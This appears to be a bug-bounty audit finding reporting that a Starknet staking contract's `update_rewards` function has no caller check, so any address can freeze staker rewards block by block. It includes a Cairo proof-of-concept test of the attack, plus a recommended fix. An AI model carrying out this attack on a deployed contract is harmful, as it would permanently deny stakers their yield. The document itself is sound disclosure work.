### Title
Missing Caller Validation in `update_rewards` Allows Any Address to Permanently Freeze Staker Yield - (File: `src/staking/staking.cairo`)

---

### Summary

`IStakingRewardsManager::update_rewards` is specified to be callable only by the Starkware sequencer, but the implementation contains no caller check. Any unprivileged address can call it with `disable_rewards: true`, consuming the single global `last_reward_block` slot for the current block and permanently preventing the legitimate sequencer from distributing rewards for that block. Repeated every block, this freezes all staker yield indefinitely.

---

### Finding Description

The spec explicitly restricts `update_rewards` to the Starkware sequencer:

> **access control**: Only starkware sequencer. [1](#0-0) 

The implementation in `StakingRewardsManagerImpl` performs no `get_caller_address()` check at all:

```cairo
fn update_rewards(
    ref self: ContractState, staker_address: ContractAddress, disable_rewards: bool,
) {
    self.general_prerequisites();
    let current_block_number = starknet::get_block_number();
    assert!(
        current_block_number > self.last_reward_block.read(),
        "{}",
        Error::REWARDS_ALREADY_UPDATED,
    );
    // ... staker validation ...
    self.last_reward_block.write(current_block_number);   // ← written unconditionally
    if disable_rewards || self.is_pre_consensus() {
        return;                                            // ← exits without distributing
    }
    // ... reward distribution ...
}
``` [2](#0-1) 

There is no `sequencer` keyword, no `CALLER_IS_NOT_SEQUENCER` error, and no role check anywhere in the production Cairo source: [3](#0-2) 

The guard `current_block_number > self.last_reward_block.read()` is a **global, single-slot** lock — it is not per-staker. Once any caller writes `last_reward_block = current_block_number`, the assertion fails for every subsequent call in the same block, regardless of which staker is passed.

---

### Impact Explanation

An attacker calls `update_rewards(any_valid_active_staker, disable_rewards: true)` once per block. The function:

1. Passes all staker-existence and balance checks (using any legitimate staker address).
2. Writes `last_reward_block = current_block_number` at line 1485.
3. Returns immediately at line 1487–1488 without distributing any rewards.

The legitimate sequencer's subsequent call for the same block reverts with `REWARDS_ALREADY_UPDATED`. No rewards are credited to `unclaimed_rewards_own` for any staker for that block. Repeated every block, this **permanently freezes all unclaimed yield** for all stakers and all delegation pools.

This matches the allowed High impact: **Permanent freezing of unclaimed yield or unclaimed royalties**. [4](#0-3) 

---

### Likelihood Explanation

- The entry point is a public, permissionless external function — no tokens, no stake, no role required.
- The attacker only needs to know one valid active staker address (trivially obtained from on-chain events).
- The cost is a single cheap transaction per block.
- The attack is fully automated and can run indefinitely.
- There is no economic barrier or slashing risk.

---

### Recommendation

Add a caller check at the top of `update_rewards` that asserts `get_caller_address()` equals the registered sequencer address (or an equivalent privileged role stored in contract configuration). For example:

```cairo
fn update_rewards(
    ref self: ContractState, staker_address: ContractAddress, disable_rewards: bool,
) {
    self.general_prerequisites();
+   assert!(
+       get_caller_address() == self.sequencer_address.read(),
+       "{}",
+       Error::CALLER_IS_NOT_SEQUENCER,
+   );
    // ... rest of function
}
```

Alternatively, restrict via the existing role-based config (e.g., `app_governor` or a dedicated sequencer role stored in `IStakingConfig`). [5](#0-4) 

---

### Proof of Concept

```cairo
#[test]
fn test_poc_anyone_can_disable_rewards() {
    let mut cfg: StakingInitConfig = Default::default();
    general_contract_system_deployment(ref :cfg);
    let staking_contract = cfg.test_info.staking_contract;
    let staking_rewards_dispatcher = IStakingRewardsManagerDispatcher {
        contract_address: staking_contract,
    };
    stake_for_testing_using_dispatcher(:cfg);
    advance_k_epochs_global(); // staker becomes active

    let staker_address = cfg.test_info.staker_address;
    let attacker = 0xdeadbeef.try_into().unwrap();

    // Attacker calls update_rewards with disable_rewards=true — no special role needed.
    cheat_caller_address_once(contract_address: staking_contract, caller_address: attacker);
    staking_rewards_dispatcher.update_rewards(:staker_address, disable_rewards: true);

    // Legitimate sequencer now cannot distribute rewards for this block.
    let safe_dispatcher = IStakingRewardsManagerSafeDispatcher {
        contract_address: staking_contract,
    };
    let result = safe_dispatcher.update_rewards(:staker_address, disable_rewards: false);
    // Panics with REWARDS_ALREADY_UPDATED — rewards for this block are lost.
    assert_panic_with_error(:result, expected_error: Error::REWARDS_ALREADY_UPDATED.describe());
}
```

The existing test suite already demonstrates that `update_rewards` is called without any caller restriction in all test scenarios — no `cheat_caller_address` to a sequencer role is ever required: [6](#0-5) [7](#0-6)

### Citations

**File:** docs/spec.md (L1644-1645)
```markdown
#### access control <!-- omit from toc -->
Only starkware sequencer.
```

**File:** src/staking/staking.cairo (L1447-1507)
```text
    #[abi(embed_v0)]
    impl StakingRewardsManagerImpl of IStakingRewardsManager<ContractState> {
        fn update_rewards(
            ref self: ContractState, staker_address: ContractAddress, disable_rewards: bool,
        ) {
            self.general_prerequisites();
            let current_block_number = starknet::get_block_number();
            assert!(
                current_block_number > self.last_reward_block.read(),
                "{}",
                Error::REWARDS_ALREADY_UPDATED,
            );

            // Assert staker exists and active.
            // Staker is considered to exist from the moment of `stake` (when `InternalStakerInfo`
            // struct is created) until the calling to `unstake_action` (when `InternalStakerInfo`
            // struct is deleted).
            // Staker remains active until the intent period begins, i.e. K epochs after
            // `unstake_intent` is called.
            let staker_info = self.internal_staker_info(:staker_address);
            let curr_epoch = self.get_current_epoch();
            assert!(
                self.is_staker_active(:staker_address, epoch_id: curr_epoch),
                "{}",
                Error::INVALID_STAKER,
            );

            let staker_pool_info = self.staker_pool_info.entry(staker_address).as_non_mut();
            let (staker_total_strk_balance, staker_total_btc_balance) = self
                .get_staker_total_strk_btc_balance_at_epoch(
                    :staker_address, :staker_pool_info, epoch_id: curr_epoch,
                );
            // Assert staker has non-zero balance.
            // Staker exists with zero balance for the first K epochs after `stake`, then the stake
            // becomes effective.
            assert!(staker_total_strk_balance.is_non_zero(), "{}", Error::INVALID_STAKER);

            // Update last block rewards.
            self.last_reward_block.write(current_block_number);

            if disable_rewards || self.is_pre_consensus() {
                return;
            }

            // Get current block data and update rewards.
            let reward_supplier_dispatcher = self.reward_supplier_dispatcher.read();
            let (strk_block_rewards, btc_block_rewards) = self
                .calculate_block_rewards(:reward_supplier_dispatcher, :curr_epoch);
            self
                ._update_rewards(
                    :staker_address,
                    strk_total_rewards: strk_block_rewards,
                    btc_total_rewards: btc_block_rewards,
                    strk_total_stake: staker_total_strk_balance,
                    btc_total_stake: staker_total_btc_balance,
                    :staker_info,
                    :staker_pool_info,
                    :reward_supplier_dispatcher,
                    :curr_epoch,
                );
        }
```

**File:** src/staking/tests/test.cairo (L3511-3516)
```text
    let staker_info_expected = StakerInfoV1 {
        unclaimed_rewards_own: strk_block_rewards, ..staker_info_before,
    };
    let mut spy = snforge_std::spy_events();
    staking_rewards_dispatcher.update_rewards(:staker_address, disable_rewards: false);
    let staker_info_after = staking_dispatcher.staker_info_v1(:staker_address);
```

**File:** src/staking/tests/test.cairo (L3871-3884)
```text
    assert_panic_with_error(:result, expected_error: Error::INVALID_STAKER.describe());
    let result = staking_rewards_safe_dispatcher
        .update_rewards(:staker_address, disable_rewards: false);
    assert_panic_with_error(:result, expected_error: Error::INVALID_STAKER.describe());

    advance_epoch_global();
    staking_rewards_dispatcher.update_rewards(:staker_address, disable_rewards: false);
    // Catch REWARDS_ALREADY_UPDATED.
    let result = staking_rewards_safe_dispatcher
        .update_rewards(:staker_address, disable_rewards: true);
    assert_panic_with_error(:result, expected_error: Error::REWARDS_ALREADY_UPDATED.describe());
    let result = staking_rewards_safe_dispatcher
        .update_rewards(:staker_address, disable_rewards: false);
    assert_panic_with_error(:result, expected_error: Error::REWARDS_ALREADY_UPDATED.describe());
```
